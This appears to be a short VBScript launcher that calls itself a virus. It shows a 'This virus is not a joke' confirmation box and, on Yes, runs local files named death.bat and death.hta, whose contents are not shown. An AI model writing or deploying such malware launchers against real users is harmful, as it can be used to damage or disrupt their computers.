Dim userResponse
userResponse = MsgBox("This virus is not a joke. Do you really want to proceed?", vbYesNo + vbCritical, "Warning")

If userResponse = vbNo Then
    WScript.Quit
Else
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "assets\death.bat"
    objShell.Run "assets\death.hta"
End If
